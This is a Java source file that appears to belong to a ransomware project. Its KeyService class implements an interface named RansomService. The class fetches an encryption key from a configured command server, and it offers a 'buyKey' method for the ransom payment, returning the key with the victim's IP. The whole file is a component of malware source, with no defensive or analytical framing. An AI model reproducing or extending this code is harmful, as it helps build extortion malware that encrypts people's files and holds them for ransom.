package Agent.services;

import javax.crypto.spec.SecretKeySpec;

import org.json.JSONObject;

import Agent.Utils.HttpUtil;
import Agent.configuration.ConfigureProps;
import Agent.entites.CryptoKey;
import Agent.exceptions.CryptOperationException;
import Agent.exceptions.CryptoException;
import Agent.exceptions.HttpResException;
import Agent.exceptions.InOutException;
import Agent.exceptions.JsonException;

public class KeyService implements RansomService {

	private String urlGetKey;
	private String urlBuyKey;

	@Override
	public CryptoKey getKey() throws CryptoException {
		try {
			urlGetKey = ConfigureProps.getPropsValue("server.url.get");
			return sendRequest(urlGetKey);
		} catch (InOutException e) {
			throw new CryptOperationException("Could not get the url", e);
		}
	}

	@Override
	public CryptoKey buyKey() throws CryptoException {
		try {
			urlBuyKey = ConfigureProps.getPropsValue("server.url.buy");
			return sendRequest(urlBuyKey);
		} catch (InOutException e) {
			throw new CryptOperationException("Could not get the url", e);
		}
	}

	private CryptoKey sendRequest(String url) throws CryptoException {
		try {
			final JSONObject json = (JSONObject) HttpUtil.get(url);
			final String al = json.get("algorithm").toString();
			final byte[] decodedKey = json.get("_key").toString().getBytes();
			return new CryptoKey(json.get("ip").toString(), new SecretKeySpec(decodedKey, 0, decodedKey.length, al),
					al);
		} catch (InOutException | HttpResException | JsonException e) {
			throw new CryptoException("Request denied", e);
		}
	}

}